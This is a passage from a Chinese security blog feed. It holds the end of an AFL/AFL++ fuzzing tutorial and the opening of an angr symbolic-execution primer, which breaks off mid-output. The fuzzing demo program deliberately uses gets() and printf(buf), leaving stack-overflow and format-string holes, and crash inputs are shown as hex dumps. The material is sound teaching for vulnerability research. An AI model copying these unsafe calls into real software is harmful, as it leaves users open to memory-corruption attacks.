title="实例demo"></a>实例demo</h1><p>我们以这个简单的c语言程序为demo尝试一下AFLFuzz的使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>使用<code>afl-gcc -g -o demo ./demo.c</code>编译</p><p>创建两个文件夹<code>fuzz_in</code>和<code>fuzz_out</code>,然后在<code>fuzz_in</code>随便放个文本文件,写入任意字符串,这里写入的是<code>hello</code></p><p>之后启动<code>afl-fuzz -i fuzz_in -o fuzz_out demo</code></p><p>在跑了十分钟左右之后结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-12_193051.png" alt=""></p><p>发现了3条路径6个crash,进入fuzz_out,文件作用大致如下</p><ol><li><strong>queue</strong>：存放所有具有独特执行路径的测试用例。</li><li><strong>crashes</strong>：导致目标接收致命signal而崩溃的独特测试用例。</li><li><strong>crashes/README.txt</strong>：保存了目标执行这些crash文件的命令行参数。</li><li><strong>hangs</strong>：导致目标超时的独特测试用例。</li><li><strong>fuzzer_stats</strong>：afl-fuzz的运行状态。</li><li><strong>plot_data</strong>：用于afl-plot绘图。</li></ol><p>分析一下crash样本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">find ./fuzz_out/crashes/ -<span class="built_in">type</span> f -name <span class="string">&#x27;id*&#x27;</span> -<span class="built_in">exec</span> sh -c <span class="string">&#x27;for file do echo &quot;Hex dump of $file:&quot;; xxd &quot;$file&quot;; echo; done&#x27;</span> sh &#123;&#125; +</span><br><span class="line">Hex dump of ./fuzz_out/crashes/id:000001,sig:11,src:000001,op:arith8,pos:0,val:-34:</span><br><span class="line">00000000: 4665 d374 6c6c                           Fe.tll</span><br><span class="line"></span><br><span class="line">Hex dump of ./fuzz_out/crashes/id:000002,sig:06,src:000000,op:havoc,rep:128:</span><br><span class="line">00000000: 1f1f 1f1f ece8 0000 0000 18e6 0400 000d  ................</span><br><span class="line">00000010: 001f 00fa 0000 18e6 0000 0000 211f 5dff  ............!.].</span><br><span class="line">00000020: 2f01 03ff fff5 0000 0000 0000 0000 fa00  /...............</span><br><span class="line">00000030: 0018 e600 0000 0021 1f5d ffff 0000 1f1f  .......!.]......</span><br><span class="line">00000040: 00ff ffff 8000 3813 0000 0000 0000 18e6  ......8.........</span><br><span class="line">00000050: 0400 000d 001f 00fa 0000 18e6 0000 0000  ................</span><br><span class="line">00000060: 211f 5dff ff00 001f 1f00 ffff ff80 0038  !.]............8</span><br><span class="line">00000070: 1300 0000 0000 0000 0001 0038 0000 fdff  ...........8....</span><br><span class="line">00000080: ff21 0018 ffff 7fff 005d 1f1f 1f00 245f  .!.......]....<span class="variable">$_</span></span><br><span class="line"></span><br><span class="line">Hex dump of ./fuzz_out/crashes/id:000004,sig:06,src:000000,op:havoc,rep:2:</span><br><span class="line">00000000: 6825 6e6c                                h%<span class="built_in">nl</span></span><br><span class="line"></span><br><span class="line">Hex dump of ./fuzz_out/crashes/id:000005,sig:11,src:000002,op:havoc,rep:4:</span><br><span class="line">00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br><span class="line">00000010: 4141 4141 4141 4141 4141 4c41 4141 4141  AAAAAAAAAALAAAAA</span><br><span class="line">00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br><span class="line">00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br><span class="line">00000040: 4141                                     AA</span><br><span class="line"></span><br><span class="line">Hex dump of ./fuzz_out/crashes/id:000003,sig:06,src:000001+000000,op:splice,rep:128:</span><br><span class="line">00000000: 4141 5141 5741 3755 2841 4141 51ff 7f41  AAQAWA7U(AAAQ..A</span><br><span class="line">00000010: 454f 6041 41a3 335c 5c5c 5c41 3741 4141  EO`AA.3\\\\A7AAA</span><br><span class="line">00000020: 4141 4141 4151 ff7f 4145 4f60 8a41 5141  AAAAAQ..AEO`.AQA</span><br><span class="line">00000030: 5741 3755 4141 5141 5741 3755 4141 5141  WA7UAAQAWA7UAAQA</span><br><span class="line">00000040: 5741 3755 4141 4141 51ff 7f41 454f 608a  WA7UAAAAQ..AEO`.</span><br><span class="line">00000050: 41a3 335c 5c41 4157 4137 5541 4141 4151  A.3\\AAWA7UAAAAQ</span><br><span class="line">00000060: ff7f 4145 4f60 4141 a341 4110 4141 51ff  ..AEO`AA.AA.AAQ.</span><br><span class="line">00000070: 7f41 454f 6041 41a3 4141 1000 003a 4100  .AEO`AA.AA...:A.</span><br><span class="line">00000080: 0140 0000 0100 9f20 20                   .@.....  </span><br><span class="line"></span><br><span class="line">Hex dump of ./fuzz_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:64:</span><br><span class="line">00000000: c3b7 c3c3 c3c3 c3c3 c3c3 c3c3 c3af c3c3  ................</span><br><span class="line">00000010: c320 c3c3 c3c3 c3c3 c3c3 c3c3 c3c3 c3c3  . ..............</span><br><span class="line">00000020: c3c3 c3c3 0000 00ff c3c3 c3c3 c3c3 c3c3  ................</span><br><span class="line">00000030: c3c3 c3c3 c3c3 c3c3 c3c3 e1c3 afad c3c3  ................</span><br><span class="line">00000040: 79ff c3c3 c3c3 c3c3 c340 c3c3 c3c3 c3c3  y........@......</span><br><span class="line">00000050: c3c3 c3c3 c3c3 c3c3 c3c3 c3c3 c3c3 c3c3  ................</span><br><span class="line">00000060: c3c3 0000 00ff c3c3 c3c3 c3c3 c3c3 c3c3  ................</span><br><span class="line">00000070: c3c3 c3c3 c3c3 c3c3 c3c3 c3c3 c3c3 c3c3  ................</span><br><span class="line">00000080: c3c3 c3c3 c3c3 c3c3 c3c3 c3c3 cfc3 c3c3  ................</span><br><span class="line">00000090: c3c3 c3c3 c3c3 c3c3 c3c3 b100 0003 e8c3  ................</span><br><span class="line">000000a0: 43e2</span><br></pre></td></tr></table></figure><p>可以看到所有漏洞都被Fuzz到了</p><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>现在我们改为使用<code>gcc -g -o demo_gcc demo.c</code>进行编译</p><p>进行无源码fuzz,命令与之前差不多,只不过多了个-Q选项,记得先<code>export AFL_PATH=~/fuzz/AFL-2.57b/</code>不然找不到qemu</p><p><code>afl-fuzz -i fuzz_in -o fuzz_out2 -Q ./demo_gcc</code></p><p>在一分钟多时就已经发现了5个crash,不过同样到10分钟左右才完整的跑出六个</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-12_204515.png" alt=""></p><p>可以看到虽然时间差异不大,但通过对比执行速度,可以看出黑盒模式下速度只有白盒的三分之一左右</p><h1 id="Fuzz网络程序"><a href="#Fuzz网络程序" class="headerlink" title="Fuzz网络程序"></a>Fuzz网络程序</h1><p>网络程序往往是从一个socket读取输入,那么如何进行fuzz,其实也可以将其转化为从标准输入读取</p><h1 id="AFL文档阅读"><a href="#AFL文档阅读" class="headerlink" title="AFL文档阅读"></a>AFL文档阅读</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>代码覆盖率（Code Coverage）</strong></p><p>代码覆盖率是模糊测试中一个极其重要的概念，<strong>使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大</strong>，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的</p><p>代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的<a href="https://clang.llvm.org/docs/SanitizerCoverage.html">官方文档</a></p><p><strong>基本块（Basic Block）</strong></p><p>这个在之前的angr使用学习中已经有一些了解了</p><p>缩写为BB，指一组顺序执行的指令，BB中第一条指令被执行后，后续的指令也会被全部执行，每个BB中所有指令的执行次数是相同的，也就是说一个BB必须满足以下特征：</p><ul><li>只有一个入口点，BB中的指令不是任何<strong>跳转指令</strong>的目标。</li><li>只有一个退出点，只有最后一条指令使执行流程转移到另一个BB</li></ul><p><strong>边（edge）</strong></p><p>fuzzer通过插桩代码捕获边（edge）覆盖率</p><p>我们可以将程序看成一个控制流图（CFG），图的每个节点表示一个基本块，而edge就被用来表示在基本块之间的转跳。知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息。</p><p><strong>元组（tuple）</strong></p><p>AFL的实现中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong> 的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;<span class="comment">//用一个随机数标记当前基本块</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;<span class="comment">//将当前块和前一块异或保存到shared_mem[]</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;<span class="comment">//cur_location右移1位区分从当前块到当前块的转跳</span></span><br></pre></td></tr></table></figure><p>实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置ecx/rcx，然后调用<code>__afl_maybe_log</code>，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。</p><h1 id="AFL源码导读"><a href="#AFL源码导读" class="headerlink" title="AFL源码导读"></a>AFL源码导读</h1><h1 id="AFLplusplus"><a href="#AFLplusplus" class="headerlink" title="AFLplusplus"></a>AFLplusplus</h1><blockquote><p>The fuzzer afl++ is afl with community patches, qemu 5.1 upgrade, collision-free coverage, enhanced laf-intel &amp; redqueen, AFLfast++ power schedules, MOpt mutators, unicorn_mode, and a lot more!</p></blockquote><p>相比原版AFL++整合完善了许多功能,例如unicorn模式,frida模式等等</p><p>安装方法可见<a href="https://aflplus.plus/building/">Building | AFLplusplus</a></p><p>默认全部安装可如下操作</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus</span><br><span class="line">$ <span class="built_in">cd</span> AFLplusplus</span><br><span class="line">$ make distrib</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>注意安装过程中会覆盖普通afl版本的二进制文件</p><h1 id="Fuzz一个pdf解析器"><a href="#Fuzz一个pdf解析器" class="headerlink" title="Fuzz一个pdf解析器"></a>Fuzz一个pdf解析器</h1><h1 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h1>]]></content>
    
    
    <summary type="html">Fuzz!Fuzz!</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="Fuzz" scheme="https://ixout.github.io/tags/Fuzz/"/>
    
    <category term="AFL" scheme="https://ixout.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>符号执行与约束求解初探</title>
    <link href="https://ixout.github.io/posts/20048/"/>
    <id>https://ixout.github.io/posts/20048/</id>
    <published>2024-05-08T11:37:25.000Z</published>
    <updated>2024-05-11T14:13:17.040Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.kanxue.com/thread-266757.htm">[原创]符号执行在自动化Pwn中的简单利用-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-5.3_symbolic_execution.md">五、高级篇 - 5.3 符号执行 - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack</a></p><p><a href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf (github.com)</a></p><p><a href="https://myts2.cn/guan-yu-fasterde-na-xie-shi/">关于Faster的那些事… (myts2.cn)</a></p><p><a href="https://zhuanlan.zhihu.com/p/675592367">符号执行 (Symbolic Execution) 与约束求解 (Constraint Solving) - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/myx-myx/articles/17009330.html">Z3求解器基础学习 （一） 从例子入门 - 说芬兰语的雪 - 博客园 (cnblogs.com)</a></p><p><a href="https://ctf-wiki.org/reverse/tools/simulate-execution/unicorn/">Unicorn Engine - CTF Wiki (ctf-wiki.org)</a></p><p>这两个东西应该逆向中会用的比较多,不过也不排除出现在pwn中(自动化pwn),而且也可以使用在自动化漏洞挖掘中,先简单学习一下常用的几个工具</p><h1 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h1><p>什么是符号执行?</p><p>简单来说就是将输入符号化,然后找到所有程序可能的执行路径与这些符号的关系</p><h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><p><a href="https://github.com/angr/angr">angr</a> 是一个多架构的二进制分析平台，具备对二进制文件的动态符号执行能力和多种静态分析能力。</p><p>官方文档<a href="https://docs.angr.io/en/latest/">angr documentation</a></p><h3 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h3><p>使用angr 的第一步是新建一个工程，几乎所有的操作都是围绕这个工程展开的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./pwn&#x27;</span>)</span><br></pre></td></tr></table></figure><p>载入二进制文件后，我们就可以访问一些基本属性，如文件名、架构、入口地址：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.arch</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.entry</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.filename</span><br></pre></td></tr></table></figure><p>angr 中的 CLE 模块用于将二进制文件载入虚拟地址空间，而CLE 最主要的接口就是 loader 类。</p><p>可以通过 Project 的 <code>.loader</code>的属性查看</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.loader</span><br><span class="line">&lt;Loaded pwn, maps [<span class="number">0x400000</span>:<span class="number">0xa07fff</span>]&gt;</span><br></pre></td></tr></table></figure><p>通过 loader, 我们可以获得二进制文件的共享库、地址空间等信息。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.loader.shared_objects</span><br><span class="line">OrderedDict([(<span class="string">&#x27;pwn&#x27;</span>, &lt;ELF Object pwn, maps [<span class="number">0x400000</span>:<span class="number">0x40a65f</span>]&gt;), (<span class="string">&#x27;libc.so.6&#x27;</span>, &lt;ELF Object libc-<span class="number">2.31</span>.so, maps [<span class="number">0x500000</span>:<span class="number">0x6f165f</span>]&gt;), (<span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>, &lt;ELF Object ld-<span class="number">2.31</span>.so, maps [<span class="number">0x700000</span>:<span class="number">0x72f18f</span>]&gt;), (<span class="string">&#x27;extern-address space&#x27;</span>, &lt;ExternObject Object cle<span class="comment">##externs, maps [0x800000:0x87ffff]&gt;), (&#x27;cle##tls&#x27;, &lt;ELFTLSObjectV2 Object cle##tls, maps [0x900000:0x91500f]&gt;)])</span></span><br></pre></td></tr></table></figure><p>但通常我们在创建工程时选择<strong>关闭</strong> <code>auto_load_libs</code> 以避免 angr 加载共享库：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = angr.Project(<span class="string">&#x27;/bin/true&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="模拟执行"><a href="#模拟执行" class="headerlink" title="模拟执行"></a>模拟执行</h3><p><code>project.factory</code> 提供了很多类对二进制文件进行分析，它提供了几个方便的构造函数。</p><p><code>project.factory.block()</code> 用于从给定地址解析一个 basic block，对象类型为 Block,基本块是angr模拟执行的最小单位，一个基本块<strong>以遇到更改ip指令(比如说jmp,jz,jnz,call等等)为止</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry)    <span class="comment"># 从程序头开始解析一个 basic block</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block</span><br><span class="line">&lt;Block <span class="keyword">for</span> <span class="number">0x401370</span>, <span class="number">42</span> <span class="built_in">bytes</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.pp()                  <span class="comment"># pretty-print of disassemble code of the block</span></span><br><span class="line"><span class="number">0x401370</span>:       xor     ebp, ebp</span><br><span class="line"><span class="number">0x401372</span>:       mov     r9, rdx</span><br><span class="line"><span class="number">0x401375</span>:       pop     rsi</span><br><span class="line"><span class="number">0x401376</span>:       mov     rdx, rsp</span><br><span class="line"><span class="number">0x401379</span>:       <span class="keyword">and</span>     rsp, <span class="number">0xfffffffffffffff0</span></span><br><span class="line"><span class="number">0x40137d</span>:       push    rax</span><br><span class="line"><span class="number">0x40137e</span>:       push    rsp</span><br><span class="line"><span class="number">0x40137f</span>:       lea     r8, qword ptr [rip + <span class="number">0x32da</span>]</span><br><span class="line"><span class="number">0x401386</span>:       lea     rcx, qword ptr [rip + <span class="number">0x3263</span>]</span><br><span class="line"><span class="number">0x40138d</span>:       lea     rdi, qword ptr [rip - <span class="number">0xe4</span>]</span><br><span class="line"><span class="number">0x401394</span>:       call    qword ptr [rip + <span class="number">0x205b76</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.instructions          <span class="comment"># 指令数量</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.instruction_addrs     <span class="comment"># 指令地址</span></span><br><span class="line">[<span class="number">4199280L</span>, <span class="number">4199282L</span>, <span class="number">4199285L</span>, <span class="number">4199286L</span>, <span class="number">4199289L</span>, <span class="number">4199293L</span>, <span class="number">4199294L</span>, <span class="number">4199295L</span>, <span class="number">4199302L</span>, <span class="number">4199309L</span>, <span class="number">4199316L</span>]</span><br></pre></td></tr></table></figure><p>另外，还可以将 Block 对象转换成其他形式：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.capstone&lt;CapstoneBlock <span class="keyword">for</span> <span class="number">0x401370</span>&gt;&gt;&gt;&gt; block.capstone.pp()&gt;&gt;&gt; block.vexIRSB &lt;<span class="number">0x2a</span> <span class="built_in">bytes</span>, <span class="number">11</span> ins., &lt;Arch AMD64 (LE)&gt;&gt; at <span class="number">0x401370</span>&gt;&gt;&gt; block.vex.pp()</span><br></pre></td></tr></table></figure><h4 id="SimState"><a href="#SimState" class="headerlink" title="SimState"></a>SimState</h4><p>angr 使用 <code>SimState</code> 类表示一个 模拟的程序状态 （simulated program state），我们的各种操作实际上是<u>由一个 state 步进到另一个 state 的过程</u>。</p><p>我们使用 <code>project.factory.entry_state()</code> 获取一个程序的初始执行状态，使用 <code>project.factory.blank_state(addr)</code> 获取一个程序从指定地址开始执行的空白状态：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="number">0xdeadbeef</span>)</span><br></pre></td></tr></table></figure><p>该对象包含了程序的内存、寄存器、文件系统数据等等模拟运行时动态变化的数据，例如：</p><ul><li><code>state.regs</code>：寄存器状态组，其中每个寄存器都为一个 <em>位向量</em> （BitVector），我们可以通过寄存器名称来访问对应的寄存器（例如 <code>state.regs.esp -= 12</code> ）。</li><li><code>state.mem</code>：该状态的内存访问接口，我们可以直接通过 <code>state.mem[addr].type</code> 完成内存访问（例如 <code>state.mem[0x1000].long = 4</code> ，对于读而言还需指定 <code>.resolved</code> 或 <code>.concrete</code> 表示位向量或是实际值，例如 <code>state.mem[0x1000].long.concrete</code>）。</li><li><code>state.memory</code>：另一种形式的内存访问接口：</li><li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量。</li><li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址。</li><li><code>state.posix</code>：POSIX 相关的环境接口，例如 <code>state.posix.dumps(fileno)</code> 获取对应文件描述符上的流。</li></ul><h4 id="sigmr"><a href="#sigmr" class="headerlink" title="sigmr"></a>sigmr</h4><p>SIMULATION_MANAGER - 模拟执行器 </p><p>angr 将一个状态的执行方法独立成一个 <code>SimulationManager</code> 类，以下两种写法等效：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> active&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> active&gt;</span><br></pre></td></tr></table></figure><p>比较重要的两个条件：</p><ul><li><code>simgr.step()</code>：<strong>以基本块为单位</strong>的单步执行。</li><li><code>simgr.explore()</code>：进行路径探索找到满足相应条件的状态。</li></ul><p><code>simgr.explore()</code> 的默认参数是 <code>find</code>，即<strong>期望条件</strong>，当模拟执行器在路径探索的过程中发现当前状态满足该条件时，该状态会被放到 <code>simgr.found</code> 列表中，若无法找到则该列表为空。</p><p>期望条件通常可以是执行到某个地址：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.explore(find=<span class="number">0x80492F0</span>) <span class="comment"># explore to a specific address</span></span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">825</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="keyword">is</span> accessing memory <span class="keyword">with</span> an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">825</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="keyword">with</span> this by generating an unconstrained symbolic variable <span class="keyword">and</span> continuing. You can resolve this by:</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="number">1</span>) setting a value to the initial state</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="number">0x7ffeff60</span> <span class="keyword">with</span> <span class="number">4</span> unconstrained <span class="built_in">bytes</span> referenced <span class="keyword">from</span> <span class="number">0x819af30</span> (strcmp+<span class="number">0x0</span> <span class="keyword">in</span> libc.so<span class="number">.6</span> (<span class="number">0x9af30</span>))</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="number">0x7ffeff70</span> <span class="keyword">with</span> <span class="number">12</span> unconstrained <span class="built_in">bytes</span> referenced <span class="keyword">from</span> <span class="number">0x819af30</span> (strcmp+<span class="number">0x0</span> <span class="keyword">in</span> libc.so<span class="number">.6</span> (<span class="number">0x9af30</span>))</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> active, <span class="number">16</span> 